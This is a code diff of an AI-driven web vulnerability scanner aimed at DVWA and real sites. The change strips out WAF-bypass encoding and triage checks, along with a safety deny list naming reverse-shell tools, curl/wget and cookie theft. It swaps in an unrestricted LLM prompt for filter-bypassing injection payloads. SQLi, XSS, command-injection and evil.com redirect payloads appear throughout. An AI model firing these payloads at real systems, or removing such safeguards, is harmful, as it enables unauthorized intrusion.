@@ -1,9 +1,7 @@
 """
-AI-Powered Bug Bounty Scanner — Production Edition v2
+AI-Powered Bug Bounty Scanner — Production Edition
 Supports: DVWA + Real-world web applications
-Features: Smart crawling, AI classification, automated attack, real-time dashboard,
-          triage verification, safe AI payloads, tech fingerprinting, WAF detection,
-          time-based blind detection, encoding bypass, header injection, multi-param testing
+Features: Smart crawling, AI classification, automated attack, real-time dashboard
 """
 
 import os
@@ -57,16 +55,15 @@ if GEMINI_API_KEY and genai:
     except Exception:
         pass
 
-# Priority: Gemini > Groq > OpenRouter (Gemini has most generous free tier: 1500 req/day)
-if gemini_client:
-    AI_PROVIDER = 'gemini'
+if OPENROUTER_API_KEY:
+    AI_PROVIDER = 'openrouter'
 elif GROQ_API_KEY:
     AI_PROVIDER = 'groq'
-elif OPENROUTER_API_KEY:
-    AI_PROVIDER = 'openrouter'
+elif gemini_client:
+    AI_PROVIDER = 'gemini'
 else:
     AI_PROVIDER = 'none'
-print(f"  🤖 AI Provider (primary): {AI_PROVIDER.upper()}")
+print(f"  🤖 AI Provider: {AI_PROVIDER.upper()}")
 
 # ─── Global State ────────────────────────────────────────────────────────────
 
@@ -121,71 +118,22 @@ def is_cancelled():
     return scan_cancel.is_set()
 
 def ai_call(prompt, temp=0.3):
-    """Call AI — one request at a time, with automatic provider fallback and retry."""
+    """Call AI — one request at a time (rate-limited)."""
     with ai_call_lock:
         result = _do_ai_call(prompt, temp)
-        time.sleep(0.8)
+        time.sleep(1.5)
         return result
 
 def _do_ai_call(prompt, temp=0.3):
-    """Try providers in order with automatic fallback on failure/rate-limit."""
-    providers = []
-    # Order: Gemini first (1500/day free), then Groq (14400/day), then OpenRouter (50/day per model)
-    if gemini_client:
-        providers.append(('gemini', _gemini_call))
-    if GROQ_API_KEY:
-        providers.append(('groq', _groq_call))
     if OPENROUTER_API_KEY:
-        providers.append(('openrouter', _openrouter_call))
-
-    if not providers:
-        raise Exception("No AI provider configured (set OPENROUTER_API_KEY, GROQ_API_KEY, or GEMINI_API_KEY)")
-
-    last_error = None
-    for name, call_fn in providers:
-        # Try up to 2 attempts per provider (with backoff for temporary rate limits)
-        for attempt in range(2):
-            try:
-                return call_fn(prompt, temp)
-            except Exception as e:
-                last_error = e
-                error_str = str(e).lower()
-                is_rate_limit = '429' in error_str or 'rate limit' in error_str or 'quota' in error_str or 'resource_exhausted' in error_str
-                if is_rate_limit and attempt == 0:
-                    # Brief wait and retry once
-                    wait_time = 3
-                    log('warn', f'  ⚡ {name.upper()} rate-limited — retrying in {wait_time}s...')
-                    time.sleep(wait_time)
-                    continue
-                elif is_rate_limit:
-                    log('warn', f'  ⚡ {name.upper()} rate-limited — falling back to next provider')
-                else:
-                    log('warn', f'  ⚡ {name.upper()} error: {str(e)[:100]} — trying next provider')
-                break  # Move to next provider
-    raise last_error
-
-# ─── OpenRouter Model Rotation ─────────────────────────────────────────────
-# Each free model has its own 50/day quota — rotating multiplies total capacity
-
-OPENROUTER_FREE_MODELS = [
-    'meta-llama/llama-3.3-70b-instruct:free',
-    'arcee-ai/trinity-large-preview:free',
-    'arcee-ai/trinity-mini:free',
-    'google/gemma-3-27b-it:free',
-    'openrouter/free',  # Auto-routes to any available free model
-]
-_openrouter_model_index = 0
-_openrouter_model_lock = threading.Lock()
-
-def _get_next_openrouter_model():
-    global _openrouter_model_index
-    with _openrouter_model_lock:
-        model = OPENROUTER_FREE_MODELS[_openrouter_model_index % len(OPENROUTER_FREE_MODELS)]
-        _openrouter_model_index += 1
-        return model
+        return _openrouter_call(prompt, temp)
+    if GROQ_API_KEY:
+        return _groq_call(prompt, temp)
+    if gemini_client:
+        return _gemini_call(prompt, temp)
+    raise Exception("No AI provider configured (set OPENROUTER_API_KEY, GROQ_API_KEY, or GEMINI_API_KEY)")
 
 def _openrouter_call(prompt, temp=0.3):
-    model = _get_next_openrouter_model()
     resp = http_req.post(
         'https://openrouter.ai/api/v1/chat/completions',
         headers={
@@ -195,32 +143,13 @@ def _openrouter_call(prompt, temp=0.3):
             'X-Title': 'Bug Bounty Scanner'
         },
         json={
-            'model': model,
+            'model': 'arcee-ai/trinity-large-preview:free',
             'messages': [{'role': 'user', 'content': prompt}],
             'temperature': temp,
             'max_tokens': 1024
         },
         timeout=60
     )
-    if resp.status_code == 429:
-        # Try a different model immediately
-        model2 = _get_next_openrouter_model()
-        resp = http_req.post(
-            'https://openrouter.ai/api/v1/chat/completions',
-            headers={
-                'Authorization': f'Bearer {OPENROUTER_API_KEY}',
-                'Content-Type': 'application/json',
-                'HTTP-Referer': 'http://localhost:7331',
-                'X-Title': 'Bug Bounty Scanner'
-            },
-            json={
-                'model': model2,
-                'messages': [{'role': 'user', 'content': prompt}],
-                'temperature': temp,
-                'max_tokens': 1024
-            },
-            timeout=60
-        )
     if resp.status_code != 200:
         raise Exception(f"OpenRouter API error {resp.status_code}: {resp.text[:200]}")
     return resp.json()['choices'][0]['message']['content'].strip()
@@ -297,8 +226,7 @@ SEVERITY = {
     'ssrf': 'High', 'xss': 'Medium', 'idor': 'High',
     'csrf': 'Medium', 'open_redirect': 'Low', 'file_upload': 'High',
     'security_headers': 'Info', 'clickjacking': 'Medium',
-    'html_injection': 'Low', 'header_injection': 'Medium',
-    'blind_sqli': 'Critical', 'blind_cmdi': 'High',
+    'html_injection': 'Low',
 }
 
 FALLBACK_PAYLOADS = {
@@ -310,187 +238,6 @@ FALLBACK_PAYLOADS = {
     'idor': ['1', '2', '0', '999', '-1'],
     'open_redirect': ['https://evil.com', '//evil.com', '/\\evil.com', 'https://evil.com%2F%2F'],
 }
-
-# ─── Target Fingerprinting & WAF Detection ───────────────────────────────────
-
-def step_fingerprint(target_url, session):
-    """Fingerprint target technology stack and detect WAFs."""
-    log('info', '═══ STAGE 0: FINGERPRINT & RECON ═══')
-    fingerprint = {
-        'server': 'unknown', 'language': 'unknown', 'framework': 'unknown',
-        'waf_detected': False, 'waf_name': 'none', 'technologies': [],
-        'interesting_headers': {}
-    }
-
-    try:
-        r = session.get(target_url, timeout=10)
-        headers = {k.lower(): v for k, v in r.headers.items()}
-
-        # Server detection
-        server = headers.get('server', '')
-        fingerprint['server'] = server or 'hidden'
-        if server:
-            log('info', f'  🖥️ Server: {server}')
-
-        # Language detection from headers
-        powered_by = headers.get('x-powered-by', '')
-        if powered_by:
-            fingerprint['technologies'].append(powered_by)
-            log('info', f'  ⚙️ X-Powered-By: {powered_by}')
-            if 'php' in powered_by.lower():
-                fingerprint['language'] = 'php'
-            elif 'asp' in powered_by.lower():
-                fingerprint['language'] = 'asp'
-            elif 'express' in powered_by.lower() or 'node' in powered_by.lower():
-                fingerprint['language'] = 'node'
-
-        # Language detection from URL/content
-        body_lower = r.text.lower()
-        url_lower = target_url.lower()
-        if '.php' in url_lower or 'phpsessid' in str(r.cookies) or 'php' in body_lower[:500]:
-            fingerprint['language'] = 'php'
-        elif '.asp' in url_lower or 'asp.net' in str(headers):
-            fingerprint['language'] = 'asp'
-        elif '.jsp' in url_lower or 'jsessionid' in str(r.cookies):
-            fingerprint['language'] = 'java'
-
-        # Framework detection
-        if 'wp-content' in r.text or 'wordpress' in body_lower:
-            fingerprint['framework'] = 'wordpress'
-        elif 'drupal' in body_lower:
-            fingerprint['framework'] = 'drupal'
-        elif 'joomla' in body_lower:
-            fingerprint['framework'] = 'joomla'
-        elif 'django' in body_lower or 'csrfmiddlewaretoken' in r.text:
-            fingerprint['framework'] = 'django'
-        elif 'laravel' in str(r.cookies) or 'laravel' in body_lower:
-            fingerprint['framework'] = 'laravel'
-        elif 'rails' in body_lower or 'csrf-token' in r.text:
-            fingerprint['framework'] = 'rails'
-
-        log('info', f'  💻 Language: {fingerprint["language"]}')
-        log('info', f'  📦 Framework: {fingerprint["framework"]}')
-
-        # WAF Detection — send a deliberate trigger
-        waf_test_payloads = [
-            ("'", 'Single quote'),
-            ('<script>', 'Script tag'),
-            ('../../../etc/passwd', 'Path traversal'),
-        ]
-
-        waf_signatures = {
-            'cloudflare': ['cloudflare', 'cf-ray', '__cfduid', 'cf-cache-status'],
-            'akamai': ['akamai', 'akamaighhost', 'x-akamai'],
-            'aws_waf': ['awselb', 'x-amzn', 'x-amz-cf'],
-            'modsecurity': ['mod_security', 'modsecurity', 'nyob'],
-            'sucuri': ['sucuri', 'x-sucuri'],
-            'imperva': ['incapsula', 'imperva', 'x-iinfo'],
-            'barracuda': ['barracuda', 'barra_counter_session'],
-            'f5_big_ip': ['bigip', 'f5', 'ts=', 'bigipserver'],
-            'wordfence': ['wordfence', 'wfwaf'],
-        }
-
-        # Check response headers for WAF signatures
-        all_headers_str = json.dumps(dict(r.headers)).lower()
-        cookie_str = str(r.cookies).lower()
-        for waf_name, signatures in waf_signatures.items():
-            for sig in signatures:
-                if sig in all_headers_str or sig in cookie_str:
-                    fingerprint['waf_detected'] = True
-                    fingerprint['waf_name'] = waf_name
-                    log('warn', f'  🛡️ WAF DETECTED: {waf_name.upper()}')
-                    break
-            if fingerprint['waf_detected']:
-                break
-
-        # Active WAF test with suspicious payloads
-        if not fingerprint['waf_detected']:
-            parsed = urlparse(target_url)
-            for payload, desc in waf_test_payloads:
-                try:
-                    test_url = f"{target_url}{'&' if '?' in target_url else '?'}waftest={payload}"
-                    r_waf = session.get(test_url, timeout=5, allow_redirects=False)
-                    if r_waf.status_code in (403, 406, 429, 503):
-                        fingerprint['waf_detected'] = True
-                        fingerprint['waf_name'] = 'generic'
-                        log('warn', f'  🛡️ WAF DETECTED: Got {r_waf.status_code} on {desc}')
-                        break
-                    # Check for WAF block pages
-                    if any(kw in r_waf.text.lower() for kw in ['blocked', 'forbidden', 'access denied', 'security', 'waf']):
-                        if r_waf.status_code != 200 or len(r_waf.text) < 2000:
-                            fingerprint['waf_detected'] = True
-                            fingerprint['waf_name'] = 'generic'
-                            log('warn', f'  🛡️ WAF DETECTED: Block page on {desc}')
-                            break
-                except Exception:
-                    pass
-
-        if not fingerprint['waf_detected']:
-            log('ok', '  ✅ No WAF detected')
-
-        # Store interesting headers
-        for h in ['x-powered-by', 'server', 'x-aspnet-version', 'x-runtime',
-                   'x-generator', 'x-drupal-cache', 'x-wordpress']:
-            if h in headers:
-                fingerprint['interesting_headers'][h] = headers[h]
-
-    except Exception as e:
-        log('error', f'  Fingerprint error: {e}')
-
-    socketio.emit('fingerprint', fingerprint)
-    return fingerprint
-
-
-# ─── Encoding Bypass Engine ──────────────────────────────────────────────────
-
-def _encode_payloads(payloads, vtype, waf_detected=False):
-    """Apply encoding variations to bypass WAFs and filters."""
-    if not waf_detected:
-        return payloads  # No encoding needed without WAF
-
-    encoded = list(payloads)  # Keep originals
-
-    for payload in payloads[:3]:  # Only encode top 3 payloads
-        # URL double-encoding
-        from urllib.parse import quote
-        encoded.append(quote(payload))
-        encoded.append(quote(quote(payload)))
-
-        if vtype in ('sqli',):
-            # SQL comment bypass: SE/**/LECT
-            for kw in ['SELECT', 'UNION', 'OR', 'AND', 'FROM', 'WHERE']:
-                if kw.lower() in payload.lower():
-                    bypassed = payload
-                    for k in [kw, kw.lower(), kw.upper()]:
-                        bypassed = bypassed.replace(k, f'{k[0]}/**/{k[1:]}')
-                    encoded.append(bypassed)
-            # Case variation
-            encoded.append(payload.replace('SELECT', 'SeLeCt').replace('UNION', 'UnIoN')
-                          .replace('select', 'SeLeCt').replace('union', 'UnIoN'))
-
-        elif vtype in ('xss',):
-            # HTML entity encoding
-            encoded.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
-            # Case mixing
-            encoded.append(payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'))
-            # Event handler variations
-            if 'onerror' in payload.lower():
-                encoded.append(payload.replace('onerror', 'ONERROR'))
-                encoded.append(payload.replace('onerror=', 'onerror\x0d='))
-
-        elif vtype in ('cmdi',):
-            # Whitespace bypass
-            encoded.append(payload.replace(' ', '${IFS}'))
-            encoded.append(payload.replace(' ', '\t'))
-
-    # Deduplicate
-    seen = set()
-    unique = []
-    for p in encoded:
-        if p not in seen:
-            seen.add(p)
-            unique.append(p)
-    return unique[:10]  # Max 10 encoded variants
 
 # ─── DVWA Auto-Login ─────────────────────────────────────────────────────────
 
@@ -1001,106 +748,73 @@ def _guess(ep):
 
 # ─── Stage 3: Attack ────────────────────────────────────────────────────────
 
-def step_attack(endpoints, session, is_dvwa=False, fingerprint=None):
+def step_attack(endpoints, session, is_dvwa=False):
     log('info', '═══ STAGE 3: ATTACK ═══')
-    fp_info = fingerprint or {}
-    waf = fp_info.get('waf_detected', False)
 
     testable = [e for e in endpoints if e.get('vuln_types')]
-
-    # ── Build full test matrix: all params × all vuln types ──
-    test_matrix = []
-    skip = {'submit', 'login', 'btnsign', 'btnclear', 'btnsubmit',
-            'user_token', 'csrf_token', 'change', 'upload', 'max_file_size',
-            'step', 'send', 'seclev_submit', '_token', 'csrf',
-            'captcha', 'submit_btn', 'action'}
+    total = sum(len(e['vuln_types']) for e in testable)
+    log('info', f'Testing {total} endpoint/vuln combinations')
+    count = 0
 
     for ep in testable:
-        injectable_params = [p for p in ep['params']
-                             if p['name'].lower() not in skip
-                             and p.get('type', '') not in ('submit', 'hidden', 'file')]
-        if not injectable_params:
-            injectable_params = [p for p in ep['params'] if p['name'].lower() not in skip]
-        if not injectable_params:
-            continue
-
-        for param in injectable_params:
-            for vtype in ep['vuln_types']:
-                test_matrix.append((ep, param, vtype))
-
-    total = len(test_matrix)
-    log('info', f'Testing {total} param/vuln combinations across {len(testable)} endpoints')
-    if waf:
-        log('warn', f'  🛡️ WAF detected ({fp_info.get("waf_name", "unknown")}) — applying encoding bypass')
-
-    found_combos = set()  # Track (url, vtype) to avoid duplicate findings
-
-    for count, (ep, target_p, vtype) in enumerate(test_matrix, 1):
         if is_cancelled():
             log('warn', 'Scan cancelled during attack phase')
             break
 
-        # Skip if we already found this vuln type on this URL
-        combo_key = f"{ep['url']}:{vtype}"
-        if combo_key in found_combos:
+        # Pick the best param to test
+        skip = {'submit', 'login', 'btnsign', 'btnclear', 'btnsubmit',
+                'user_token', 'csrf_token', 'change', 'upload', 'max_file_size',
+                'step', 'send', 'seclev_submit', '_token', 'csrf',
+                'captcha', 'submit_btn', 'action'}
+        test_params = [p for p in ep['params']
+                       if p['name'].lower() not in skip
+                       and p.get('type', '') not in ('submit', 'hidden', 'file')]
+        if not test_params:
+            test_params = [p for p in ep['params'] if p['name'].lower() not in skip]
+        if not test_params:
             continue
 
-        log('attack', f'━━━ [{count}/{total}] {vtype.upper()} → {ep["method"]} {ep["url"]} ({target_p["name"]}) ━━━')
-        emit_progress(count, total, 'attack')
+        target_p = test_params[0]
 
-        try:
-            payloads = _generate_safe_payloads(vtype, ep, target_p)
+        for vtype in ep['vuln_types']:
+            if is_cancelled():
+                break
 
-            # Apply encoding bypass if WAF detected
-            if waf:
-                payloads = _encode_payloads(payloads, vtype, waf_detected=True)
+            count += 1
+            log('attack', f'━━━ [{count}/{total}] {vtype.upper()} → {ep["method"]} {ep["url"]} ({target_p["name"]}) ━━━')
+            emit_progress(count, total, 'attack')
 
-            # Multiple baselines for stability
-            bl = _send_timed(session, ep, target_p['name'], target_p.get('default_value', 'test'))
-            bl2 = _send_timed(session, ep, target_p['name'], target_p.get('default_value', 'test'))
-            if bl and bl2:
-                bl['baseline_time_avg'] = (bl['response_time'] + bl2['response_time']) / 2
-                log('info', f'  📤 Baseline: {ep["method"]} → [{bl["status_code"]}] {bl["length"]} bytes ({bl["baseline_time_avg"]:.2f}s avg)')
-            elif bl:
-                bl['baseline_time_avg'] = bl['response_time']
-                log('info', f'  📤 Baseline: {ep["method"]} → [{bl["status_code"]}] {bl["length"]} bytes ({bl["response_time"]:.2f}s)')
+            try:
+                payloads = _get_payloads(vtype, ep)
 
-            for payload in payloads:
-                if is_cancelled():
-                    break
+                # Baseline request
+                bl = _send(session, ep, target_p['name'], target_p.get('default_value', 'test'))
+                if bl:
+                    log('info', f'  📤 Baseline: {ep["method"]} → [{bl["status_code"]}] {bl["length"]} bytes')
 
-                log('attack', f'  🔫 Payload: {payload}')
+                for payload in payloads:
+                    if is_cancelled():
+                        break
 
-                resp = _send_timed(session, ep, target_p['name'], payload)
-                if not resp:
-                    log('warn', f'  ✗ No response')
-                    continue
+                    log('attack', f'  🔫 Payload: {payload}')
 
-                log('info', f'  📥 Response: [{resp["status_code"]}] {resp["length"]} bytes ({resp["response_time"]:.2f}s)')
+                    resp = _send(session, ep, target_p['name'], payload)
+                    if not resp:
+                        log('warn', f'  ✗ No response')
+                        continue
 
-                # Check for session death
-                if resp['status_code'] == 302 or 'login.php' in resp.get('url', ''):
-                    log('warn', f'  ⚠ Session expired — skipping')
-                    continue
+                    log('info', f'  📥 Response: [{resp["status_code"]}] {resp["length"]} bytes')
 
-                vuln, evidence = _analyze(vtype, ep['url'], target_p['name'], payload, bl, resp)
+                    # Check for session death
+                    if resp['status_code'] == 302 or 'login.php' in resp.get('url', ''):
+                        log('warn', f'  ⚠ Session expired — skipping')
+                        continue
 
-                if vuln:
-                    log('ok', f'  🔍 Initial detection: {vtype.upper()} — sending to Triage Agent...')
-                    socketio.emit('log', {'level': 'triage', 'text': f'🛡️ Triage Agent verifying {vtype.upper()} on {ep["url"]}...', 'ts': time.time()})
+                    vuln, evidence = _analyze(vtype, ep['url'], target_p['name'], payload, bl, resp)
 
-                    # ── TRIAGE AGENT: Double-check the vulnerability ──
-                    triage_result = _triage_verify(
-                        session, ep, target_p, vtype, payload,
-                        evidence, bl, resp
-                    )
-
-                    if triage_result['confirmed']:
-                        log('ok', f'  ✅ TRIAGE CONFIRMED! {vtype.upper()} is real!')
-                        log('ok', f'  📋 Initial evidence: {evidence}')
-                        log('ok', f'  🛡️ Triage evidence: {triage_result["triage_evidence"]}')
-                        socketio.emit('log', {'level': 'triage', 'text': f'✅ Triage Agent CONFIRMED {vtype.upper()} — vulnerability is real', 'ts': time.time()})
-
+                    if vuln:
+                        log('ok', f'  ✅ VULNERABLE! {vtype.upper()} confirmed!')
+                        log('ok', f'  Evidence: {evidence}')
                         fid = fp(ep['method'], ep['url'], target_p['name'], vtype)
                         finding = {
                             'id': fid, 'url': ep['url'], 'method': ep['method'],
@@ -1108,38 +822,21 @@ def step_attack(endpoints, session, is_dvwa=False, fingerprint=None):
                             'payload': payload, 'evidence': evidence,
                             'severity': SEVERITY.get(vtype, 'Low'),
                             'confirmed': True,
-                            'triage_verified': True,
-                            'triage_evidence': triage_result['triage_evidence'],
-                            'triage_payload': triage_result.get('triage_payload', ''),
                             'response_code': resp['status_code'],
                             'response_snippet': resp['body'][:500],
                             'timestamp': time.time()
                         }
                         if write_finding(finding):
                             socketio.emit('finding', finding)
-                        found_combos.add(combo_key)
                         break
                     else:
-                        log('warn', f'  ❌ TRIAGE REJECTED — false positive discarded')
-                        log('warn', f'  Reason: {triage_result.get("reason", "Triage could not confirm")}')
-                        socketio.emit('log', {'level': 'triage', 'text': f'❌ Triage Agent REJECTED {vtype.upper()} — false positive', 'ts': time.time()})
-                else:
-                    log('info', f'  ✗ Not vulnerable with this payload')
+                        log('info', f'  ✗ Not vulnerable with this payload')
 
-            time.sleep(0.3)
-        except Exception as e:
-            log('error', f'  Error testing {ep["url"]}: {e}')
-
-    # ── Header Injection Testing ──
-    if testable and not is_cancelled():
-        _test_header_injection(testable[0]['url'], session, waf)
+                time.sleep(0.3)
+            except Exception as e:
+                log('error', f'  Error testing {ep["url"]}: {e}')
 
 def _send(session, ep, param_name, value):
-    """Send a request (backward compatible wrapper)."""
-    return _send_timed(session, ep, param_name, value)
-
-def _send_timed(session, ep, param_name, value):
-    """Send a request and measure response time for blind detection."""
     try:
         params = {}
         for p in ep['params']:
@@ -1148,15 +845,11 @@ def _send_timed(session, ep, param_name, value):
             else:
                 params[p['name']] = p.get('default_value', '') or 'test'
 
-        start_time = time.time()
-
         if ep['method'] == 'GET':
             url = f"{ep['url']}?{urlencode(params)}"
-            resp = session.get(url, timeout=15, allow_redirects=False)
+            resp = session.get(url, timeout=12, allow_redirects=False)
         else:
-            resp = session.post(ep['url'], data=params, timeout=15, allow_redirects=False)
-
-        response_time = time.time() - start_time
+            resp = session.post(ep['url'], data=params, timeout=12, allow_redirects=False)
 
         # Handle redirects
         if resp.status_code in (301, 302, 303, 307):
@@ -1166,14 +859,11 @@ def _send_timed(session, ep, param_name, value):
                     'status_code': 302,
                     'body': 'REDIRECTED TO LOGIN - SESSION EXPIRED',
                     'url': location,
-                    'length': 0,
-                    'headers': dict(resp.headers),
-                    'response_time': response_time
+                    'length': 0
                 }
             # Follow non-login redirects
             try:
                 resp = session.get(urljoin(ep['url'], location), timeout=12, allow_redirects=False)
-                response_time = time.time() - start_time
             except Exception:
                 pass
 
@@ -1182,441 +872,39 @@ def _send_timed(session, ep, param_name, value):
             'body': resp.text[:5000],
             'url': resp.url if hasattr(resp, 'url') else ep['url'],
             'length': len(resp.text),
-            'headers': dict(resp.headers),
-            'response_time': response_time
+            'headers': dict(resp.headers)
         }
     except Exception as e:
         log('warn', f'  Request error: {e}')
         return None
 
-
-# ─── Header Injection Testing ────────────────────────────────────────────────
-
-def _test_header_injection(target_url, session, waf_detected=False):
-    """Test for vulnerabilities via HTTP headers (User-Agent, Referer, etc.)."""
-    log('info', '═══ STAGE 3b: HEADER INJECTION ═══')
-
-    injectable_headers = {
-        'User-Agent': [
-            "' OR '1'='1' --",
-            '<script>alert(1)</script>',
-            '$(id)',
-        ],
-        'Referer': [
-            "' OR '1'='1' --",
-            '<script>alert(1)</script>',
-            'http://evil.com',
-        ],
-        'X-Forwarded-For': [
-            '127.0.0.1',
-            "' OR '1'='1' --",
-            '0.0.0.0',
-        ],
-        'X-Forwarded-Host': [
-            'evil.com',
-            '<script>alert(1)</script>',
-        ],
-    }
-
-    # Get baseline
-    try:
-        bl = session.get(target_url, timeout=10)
-        bl_body = bl.text[:5000]
-        bl_len = len(bl.text)
-    except Exception:
-        log('warn', '  Could not get baseline for header injection testing')
-        return
-
-    for header_name, payloads in injectable_headers.items():
-        if is_cancelled():
-            break
-
-        for payload in payloads:
-            try:
-                custom_headers = {header_name: payload}
-                r = session.get(target_url, headers=custom_headers, timeout=10, allow_redirects=True)
-
-                # Check if payload is reflected
-                if payload in r.text and payload not in bl_body:
-                    vuln_type = 'xss' if '<script' in payload.lower() else 'header_injection'
-                    log('ok', f'  ✅ {header_name} injection: payload reflected!')
-
-                    fid = fp('GET', target_url, header_name, vuln_type)
-                    finding = {
-                        'id': fid, 'url': target_url, 'method': 'GET',
-                        'param': f'Header: {header_name}', 'vuln_type': vuln_type,
-                        'payload': f'{header_name}: {payload}',
-                        'evidence': f'Payload injected via {header_name} header was reflected in response body',
-                        'severity': SEVERITY.get(vuln_type, 'Medium'),
-                        'confirmed': True, 'triage_verified': False,
-                        'response_code': r.status_code,
-                        'response_snippet': r.text[:500],
-                        'timestamp': time.time()
-                    }
-                    if write_finding(finding):
-                        socketio.emit('finding', finding)
-                    break
-
-                # Check for SQL errors via header
-                sql_errors = ['mysql_', 'sql syntax', 'sqlstate[', 'pg_query', 'ora-']
-                for err in sql_errors:
-                    if err.lower() in r.text.lower() and err.lower() not in bl_body.lower():
-                        log('ok', f'  ✅ SQL injection via {header_name} header!')
-                        fid = fp('GET', target_url, header_name, 'sqli')
-                        finding = {
-                            'id': fid, 'url': target_url, 'method': 'GET',
-                            'param': f'Header: {header_name}', 'vuln_type': 'sqli',
-                            'payload': f'{header_name}: {payload}',
-                            'evidence': f'SQL error triggered via {header_name} header: {err}',
-                            'severity': 'Critical',
-                            'confirmed': True, 'triage_verified': False,
-                            'response_code': r.status_code,
-                            'response_snippet': r.text[:500],
-                            'timestamp': time.time()
-                        }
-                        if write_finding(finding):
-                            socketio.emit('finding', finding)
-                        break
-
-            except Exception:
-                continue
-
-    log('ok', '  Header injection testing complete')
-
-# ─── AI Safe Payload Agent ───────────────────────────────────────────────────
-
-SAFE_PAYLOAD_RULES = {
-    'sqli': {
-        'safe': [
-            "Read-only detection: OR tautology, UNION SELECT NULL, time-based SLEEP",
-            "Error-based: single quote, double quote to trigger syntax errors",
-        ],
-        'forbidden': [
-            "NO DROP, DELETE, UPDATE, INSERT, ALTER, TRUNCATE, CREATE",
-            "NO INTO OUTFILE, INTO DUMPFILE, LOAD_FILE for writing",
-            "NO shell commands via xp_cmdshell, sys_exec",
-            "NO modification of any data whatsoever",
-        ]
-    },
-    'xss': {
-        'safe': [
-            "alert(1), alert(document.domain), console.log() — harmless JS",
-            "img/svg/body event handlers with alert() only",
-        ],
-        'forbidden': [
-            "NO document.cookie theft, NO fetch/XMLHttpRequest to external",
-            "NO keyloggers, NO credential harvesting, NO DOM manipulation",
-            "NO persistent payloads that modify stored data",
-        ]
-    },
-    'cmdi': {
-        'safe': [
-            "Read-only: id, whoami, uname -a, cat /etc/passwd (world-readable)",
-            "Time-based: sleep 3, ping -c 3 127.0.0.1",
-        ],
-        'forbidden': [
-            "NO rm, NO mkfs, NO dd, NO file deletion or modification",
-            "NO reverse shells, NO bind shells, NO wget/curl to download",
-            "NO user creation, NO permission changes, NO service manipulation",
-        ]
-    },
-    'lfi': {
-        'safe': [
-            "Read world-readable files: /etc/passwd, /etc/hostname",
-            "Path traversal with encoding variations",
-        ],
-        'forbidden': [
-            "NO /etc/shadow, NO private keys, NO writing files",
-            "NO PHP wrappers that execute code (except php://filter for read)",
-            "NO log poisoning, NO file upload chaining",
-        ]
-    },
-    'ssrf': {
-        'safe': [
-            "Localhost probing: 127.0.0.1, [::1], 0x7f000001",
-            "Metadata endpoints: 169.254.169.254 (read-only detection)",
-        ],
-        'forbidden': [
-            "NO port scanning of internal networks",
-            "NO requests to external attacker-controlled servers",
-            "NO file:// protocol for reading sensitive files",
-        ]
-    },
-    'open_redirect': {
-        'safe': [
-            "Redirect to well-known domains: https://example.com, //example.com",
-            "Protocol-relative URLs, path-based bypasses",
-        ],
-        'forbidden': [
-            "NO javascript: URIs with harmful code",
-            "NO data: URIs with executable content",
-        ]
-    },
-}
-
-def _generate_safe_payloads(vtype, ep, target_param):
-    """AI Safe Payload Agent — generates context-aware, 100% safe payloads."""
+def _get_payloads(vtype, ep):
     pnames = [p['name'] for p in ep['params']]
-    rules = SAFE_PAYLOAD_RULES.get(vtype, {})
-    safe_rules = '\n'.join(f'  ✅ {r}' for r in rules.get('safe', []))
-    forbidden_rules = '\n'.join(f'  🚫 {r}' for r in rules.get('forbidden', []))
+    prompt = f"""Generate 3-5 penetration test payloads.
 
-    prompt = f"""You are a SAFE Payload Generation Agent for ethical penetration testing.
-Your job is to create payloads that PROVE a vulnerability exists WITHOUT causing any damage.
+VULN: {vtype}
+URL: {ep['url']}
+METHOD: {ep['method']}
+PARAMS: {json.dumps(pnames)}
 
-TARGET CONTEXT:
-- Vulnerability type: {vtype}
-- URL: {ep['url']}
-- HTTP Method: {ep['method']}
-- Parameter to inject: {target_param['name']} (type: {target_param.get('type', 'text')})
-- Default value: {target_param.get('default_value', 'N/A')}
-- All parameters: {json.dumps(pnames)}
-- Endpoint type: {ep.get('type', 'unknown')}
+For sqli: UNION, OR tautology, error-based, time-based.
+For xss: script, img onerror, svg onload — bypass common filters.
+For cmdi: semicolon+command, pipe+command, backticks.
+For lfi: traversal to /etc/passwd with different encodings.
+For open_redirect: external URLs with various bypass techniques.
 
-SAFETY RULES (MUST FOLLOW):
-{safe_rules}
-
-FORBIDDEN (NEVER GENERATE):
-{forbidden_rules}
-
-GENERAL SAFETY MANDATE:
-- Every payload MUST be read-only and non-destructive
-- Payloads should DETECT the vulnerability, not EXPLOIT it
-- Use harmless proof-of-concept techniques only (alert boxes, reading public files, timing)
-- Consider the specific parameter name and context to craft targeted payloads
-- Generate 4-6 payloads, ordered from most likely to succeed to least likely
-- Each payload should test a DIFFERENT technique (don't repeat the same approach)
-
-Respond with ONLY a JSON array of payload strings:
-["payload1", "payload2", "payload3", "payload4"]"""
+ONLY JSON array of strings:
+["payload1", "payload2"]"""
 
     try:
-        raw = ai_call(prompt, temp=0.3)
+        raw = ai_call(prompt, temp=0.4)
         result = parse_json(raw)
         if isinstance(result, list):
-            payloads = [p if isinstance(p, str) else p.get('payload', str(p)) for p in result]
-            # Safety filter: reject any payload with destructive keywords
-            safe_payloads = [p for p in payloads if _is_payload_safe(p, vtype)]
-            if safe_payloads:
-                log('ai', f'  🛡️ Safe Payload Agent generated {len(safe_payloads)} payloads')
-                return safe_payloads[:6]
-            else:
-                log('warn', f'  ⚠ All AI payloads failed safety check — using safe fallbacks')
-    except Exception as e:
-        log('warn', f'  Safe Payload Agent error ({e}) — using safe fallbacks')
-
-    return SAFE_FALLBACK_PAYLOADS.get(vtype, ['test'])
-
-
-def _is_payload_safe(payload, vtype):
-    """Hard safety filter — rejects any payload with destructive intent."""
-    payload_lower = payload.lower()
-
-    # Universal dangerous patterns
-    dangerous = [
-        'drop ', 'delete ', 'update ', 'insert ', 'alter ', 'truncate ',
-        'create ', 'into outfile', 'into dumpfile', 'xp_cmdshell',
-        'sys_exec', 'load_file', 'rm -', 'rm /', 'mkfs', 'dd if=',
-        'chmod ', 'chown ', 'useradd', 'passwd ', '/etc/shadow',
-        'reverse', 'bind shell', 'nc -', 'ncat ', 'bash -i',
-        'python -c', 'perl -e', 'ruby -e', 'wget ', 'curl ',
-        'fetch(', 'xmlhttprequest', 'document.cookie',
-        'new image', 'navigator.sendbeacon',
-    ]
-    for d in dangerous:
-        if d in payload_lower:
-            log('warn', f'  🚫 Safety filter blocked payload containing: {d}')
-            return False
-    return True
-
-
-# Safe fallback payloads (guaranteed non-destructive)
-SAFE_FALLBACK_PAYLOADS = {
-    'sqli': [
-        "' OR '1'='1",
-        "' OR '1'='1' --",
